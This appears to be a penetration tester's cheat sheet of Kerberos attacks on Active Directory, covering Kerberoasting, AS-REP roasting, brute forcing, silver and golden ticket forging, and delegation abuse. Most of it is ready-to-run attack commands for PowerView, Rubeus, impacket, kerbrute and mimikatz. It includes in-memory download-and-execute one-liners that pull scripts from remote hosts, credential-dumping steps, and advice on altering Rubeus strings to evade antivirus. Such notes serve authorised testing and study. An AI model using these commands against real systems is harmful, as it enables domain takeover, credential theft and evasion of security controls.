                    -----port 88

                        -----Kerberoast

    Kerberoasting involves requesting a Kerb Service Ticket (TGS) from a Windows Domain Machine or Kali Box using something like GetUserSPN’s.py. The problem with TGS is once the the DC looks up the target SPN it encrypts the TGS with the NTLM Password Hash of the targeted user account.

    !impacket GetUserSPN’s.py
    SPN=Service Principal Name


-From Windows

            PowerView

    Enumeretating

    IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')

    !Defender will catch this propably based on strings

    Now with PowerView in memory on a Domain-Joined Machine we can run

    Get-DomainUser -SPN

    OR using credetials

    $secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential('m0chan\user', $secpasswd)

    Get-DomainUser -SPN -Credential $cred


    Exploit

    Now with the target service accounts in our scopes we can actually request a ticket for cracking which couldn’t be easier with PowerView.ps1

    Get-DomainSPNTicket -SPN <spn> -OutputFormat {hashcat,john} -Credential $cred



            Rubeus(https://github.com/GhostPack/Rubeus`)

    
    Enumeration

    using powershell

    get-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate

    dsquery * "ou=domain controllers,dc=yourdomain,dc=com" -filter "(&(objectcategory=computer)
    (servicePrincipalName=*))" -attr distinguishedName servicePrincipalName > spns.txt


    Exploit

    To get Rubeus you will actually need Visual Studio 2017 or anything that can compile .NET. In my case I use Visual Studio and build myself an assembly
    Rubeus is only detected by one AV vendor on Virus Total however if your AV is flagging it just change some strings and comments and rebuild the project and your AV will shut up. 

    First we can try to Roast all Users in the Current Domain (May be Noise)
    PS > .\Rubeus kerberoast

    Kerberoast All Users in a Specific OU (Good if Organization has all Service Accounts in a Specific OU)

    PS > .\Rubeus kerberoast /ou:OU=SerivceAcc,DC=m0chanAD,DC=local /outfile:C:\Temp\TotallyNotHashes.txt

    Roasting a Specific Users or SPN

    PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /user:mssqlservice

    PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /spn:MSSQLSvc/SQL.m0chanAD.local

    
    
    
            Invoke-Kerberoast.ps1

    

    PS C:\Temp > IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1";Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.kerberoast





--From Linux

    Kerberoasting from Linux is a little but different as we are most likely not authenticated to the domain in anyway so will have to pass a stolen Kerberos ticket through for authentication or domain credentials.

            
            GetUserSPNs.py

    Using impackets GetUserSPNs.py with found creds

    $ python GetUserSPNs.py m0chanAD/pwneduser:pwnedcreds -outputfile hashes.kerberoast






                            ------AS-REP Roasting


    AS-REP roasting is an attack that  you have to explicitly set Accounts Does not Require Pre-Authentication aka DONT_REQ_PREAUTH.

    Pre-Authentication is the first step in Kerberos Authentication and it’s main role is to try prevent against brute-force password guessing attacks.

    Typcially during Pre-Auth a user will enter his creds which will be used to encrypt a time stamp and the DC will decrypt it to validate that the correct creds were used. If the DC verifies okay it will issue a TGT however if Pre-Authentication is disabled it would allow an attacker to request a ticket for any user and the DC would simply return a TGT which will be encrypted similar to the Kerberoast attack which can be cracked offline.


-From Windows

                Powerview

    Enumeration

    First let’s import PowerView.ps1 into Memory with
    IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')

    !will propably flagged by the defender

    Now with PowerView in memory on a Domain-Joined Machine we can simply run

    Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose

    OR

    Get-DomainUser victimuser | Convert-FromUACValue

    
    Exploit

    Armed with our target user with DONT_REQ_PREAUTH set we can now request the relevant ticket to crack offline. Sadly PowerView.ps1 does not have a ASREP Roasting Function included however the author harmj0y or PowerView created a fantastic module to do this with
    
    https://github.com/HarmJ0y/ASREPRoast

    Simply Import the Module with

    Import-Module .\ASREPRoast.ps1

    Get-ASRepHash -Domain m0chanAD.local -UserName m0chan

    This will return a Hash which you can crack with Hashcat with the below Syntax

    hashcat64.exe -a 0 -m 7500 asrep.hash /wordlists/rockyou.txt



            Rebeus


    The asreproast functionality of Rebeus actually is intended to fully replace harmj0ys ASREPRoast Powershell module I coupled with PowerView in the section above.

    Exploitation

    First we can try to Roast all Users in the Current Domain (May be Noise)
    PS >  .\Rubeus asrep /format:hashcat

    ASREP All Users in a Specific OU (Good if Organization has all Service Accounts in a Specific OU)

    PS > .\Rubeus asrep /ou:OU=SerivceAcc,DC=m0chanAD,DC=local /format:hashcat /outfile:C:\Temp\Hashes.txt

    Roasting a Specific Users
    PS > .\Rubeus asrep /user:mssqlservice /format:hashcat


-From Linux

                GetNPUsers.py

    https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

    $ python GetNPUsers.py m0chanAD/ -usersfile TargetUsers.txt -format hashcat -outputfile hashes.asreproast


        This script can dynamically obtain the list of users in the domain

        either through an RPC Null Session
        or with an authenticated LDAP access to the domain (user or computer account)
        If the users list cannot be dynamically retrieved, a file can be supplied.
        


                        Kerberos Bruteforcing

Windows
            Using Rubeus forked ps1 script  (https://github.com/Zer1t0/Rubeus)

    PS > .\Rubeus.exe brute /users:usernames.txt /passwords:pass.txt /domain:m0chanAd.local /outfile:brutepasswords.txt


--From Linux

                    kerbrute.py   https://github.com/TarlogicSecurity/kerbrute

    $ python kerbrute.py -domain m0chanAD.local -users usernames.txt -passwords pass.txt -outputfile foundusers.txt





                        Silver Ticket


    most think that Silver Tickets are nothing compared to Golden Tickets but they are mistaken, silver tickets are just as dangerous and even more stealthier.

    This is because giving the nature of the attack there is no communication with the DC hence the stealth.

    Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets.

    In order to generate a Silver-Ticket you require the NTLM hash of a Service Account, typically services run under traditional user accounts with a SPN value for ex. mssql & iis user etc.

    we could employ a Pass-The-Ticket attack and/or Inject the ticket into our current session to access other available resources.


                Creating Ticket with Mimikatz

    Mimikatz Silver Ticket Guide

/domain: The FDQN
/sid: The SID (Security Identifier) of the Domain (whoami /user)
/user: Target Account/Computer to Impersonate
/id: RID of the account you will be impersonating
/ptt: Optional (Will Inject Ticket or you can do with Rubeus)
/rc4: NTLM Hash of User Password/Computer Password


The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit). The NTLM password hash is used with the /rc4 paramteer. The service SPN type also needs to be identified in the /service parameter. Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.


mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit

As I mentioned above let’s say we have the NTLM hash of a Service Account (MSSQL) we can create a Silver Ticket for said User and then start issue SQL Commands to a Database providing the Database accepts Kerberos authentication (Most likely will)

mimikatz.exe
prvilege::debug

kerberos::golden /id:1106 /domain:m0chanAD.local /sid:S-1-5-21-1473643419-774954089-2222323452 /target:sqlserver.m0chanAD.local /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:MSSQLSvc /user:m0chanFake /ptt


As you can see in the above examples I have applied the /ptt flag which will automatically inject the ticket into my current session but we can choose to output it to a file with the /ticket flag which will output a ticket.kirbi file by default unless directly specified.

We can then use this kirbi ticket for a certain level of persistence and/or inject them with Rubeus which Iw ill display below.

        Injecting Ticket with Rubeus

We can use Rubeus to inject Silver Tickets into our session by 2 methods, .kirbi file or a Base64 of said .kirbi file which I find very useful.

PS > .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

PS > .\Rubeus.exe ptt /ticket:BASE64BLOBHERE



From Linux

        ticketer.py

$  python ticketer.py -domain-sid S-1-5-21-1473643419-774954089-2222323452 -nthash d7e2b80507ea074ad59f152a1ba20458 -domain m0chanAD.local -spn cifs/workstation.m0chanAD.local m0chan


#This will export a .ccache file which can be imported by executing the below command

KRB5CCNAME=/scripts/m0chan.ccache 

We can then pass the -K switch through with any other Impacket scripts and it will automatically use the cached kerberos ticket, such as PSEXec, WMIExec




                        Godlen Tickets

    we are not targeting Computer Hash's or User Hash's but instead the hash of the krbtgt account which can typically only be retrieved from pwning the Domain Controller and dumping the NTDS.dit file and/or Dumping LSAAS on the DC and putting it through Mimikatz

     You can get this NTLM hash from one of the options below

    Mimikatz on Domain Controller (lsadump::dcsync and/or sekurlsa::logonpasswords all)
    Dumping NTDS.dit
    DCSync


                Creating Ticket with Mimikatz

    Golden Ticket Requirements

Domain Name: m0chanAD.local
Domain SID: S-1-5-21-1473643419-774954089-2222323452 (whoami /user)
KRBTGT NTLM Hash: d7e2b80507ea074ad59f152a1ba20458
ID: 500 (Administrator SID), 518 (Schema Admins), 519 (Enterprise Admin)


    Generate Ticket

mimikatz.exe 
kerberos::golden /domain:m0chanAD.local /sid:<domain-sid> /krbtgt:<krbtgt> /id:500 /user:FakeAdmin /ticket persistance4life.kirbi



                Unconstrained Delegation


    Unconstrained Delegation is a privilege that can be granted to User Accounts or Computer Accounts in a active directory environment that allows a resources to authenticate to another resource on BEHALF of a user. 



    Discovering Targets with Unconstrained Delegation Enabled

    PS > Import-Module -ActiveDirectory

    PS > Get-ADComputer -Filter {(TrustedForDelegation - eq $true) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description

    #Or Simply
    PS > Get-ADComputer -Filter {(TrustedForDelegation - eq $true)} 


    #PowerView

    PS > Get-DomainComputer -Unconstrained 




                    Constrained Delegation

    Unconstrained Delegation has no limits in terms of what Kerberos services a Server can authenticate to on your behalf. i/e Once you have handed over your TGT if the server is trusted for Unconstrained Delegation then it can theoretically request a TGS ticket for any other Kerberos Service within the Realm which isn’t exactly ideal.

    Constrained Delegation limits what services a particular machine trusted for Delegation can actually access on behalf of an authenticated user


    S4U2Proxy

    The Server-for-User-to-Proxy is an extension that allows a service to use it’s Kerberos service ticket for a specific user to obtain a TGS ticket from the KDC to access a back-end-service on behalf of a user. The S4U2Proxy s being used 9/10 times that Constrained Delegation is in use.


    This extension works in the following order

    User Sends a TGS to Access Service 1
    Providing Service 1 is permitted to delegate to another Service, for ex Service 2
    Service 1 now issues a S42UProxy Request for a TGS Ticket for requesting user to Service 2 with the requesting users TGS Ticket
    Service 1 sends TGS Ticket to Service 2
    Service 1 connects to Service 2 authenticating as the requesting user.

Note: The TGS Ticket provided in the S4U2Proxy request must have the FORWARDABLE flag set. This flag is never set for accounts that have Account is Sensitive and Cannot Be Delegated set.



            S4U2Self

    The SVU2Self extension is only required if a user authenticates with something other than Kerberos such as NTLM, but the delegation to the second service (second hop) will always be completed in Kerberos. This is called Protocol Transition

    S4U2Self can ask the authentication service to product a TGS for a arbitrary user (any user) which can therefore be passed over to S4U2Proxy to request a ticket for another service i/e Service 2

    This is why if you pwn a server with constrained delegation enabled (any protocol) you can theoretically impersonate any user in the domain against any respective SPNs (More on this below in Exploiting Section)


    
    Enumeratiing Services with Contrained Delegation

    PS > Import-Module ActiveDirectory

    PS > Get-ADComputer -Filter {(msDS-AllowedToDelegateTo -ne "{}")} -Properties TrustedForDelegation,TrustedToAuthForDelegation,ServicePrincipalName,Description,msDS-AllowedToDelegateTo

    #PowerView

    PS > Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol -Verbose | fl 




    Exploiting

    Now exploiting Constrained Delegation is a little but different to Unconstrained Delegation as we can’t just simply grab pwn the Server’s/Users’ trusted for Delegation and snatch the cached TGT tickets.

    We simply have to find high value targets that are set to delegate for high value resources, a good example would be a server trusted for cifs Delegation on a machine, this would allow us to read the files on the target system by snatching the cached TGS ticket.

    Another great one is if a machine trusts the DC & LDAP for Delegation then we can DC Sync ;)


            Exploiting with Rubeus

    If we can gain access to a user/computer account configured for Constrained Delegation if we run the below command

    PS > .\Rubeus.exe dump

    This will dump any relevant cached TGS ticket’s stored on the box which we can then perform a PTT ticket attack similar to the Pass-The-Ticket section above.

        
        Plaintext Password too Service Access

    Basically this attack works around the basis that you have compromised a plaintext password of a user account that is trusted for Constrained Delegation and/or a RC4 Hash/AES Key. Basically you can use the pass the users password/NTLM hash, request a TGT & execute a request for a TGS ticket and of course access the respective SPN / Service

                !ask tgt

    PS > .\Rubeus.exe asktgt /user:m0chan /domain:m0chanAD.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6

            !Issue S4U Request to Delegated SPN with Specified User
    PS > .\Rubeus.exe s4u /ticket:C:\Temp\Tickets\aidanldap.kirbi /impersonateuser:aidan /msdsspn:ldap/dc.m0chanAD.local /altservice:cifs /ptt


    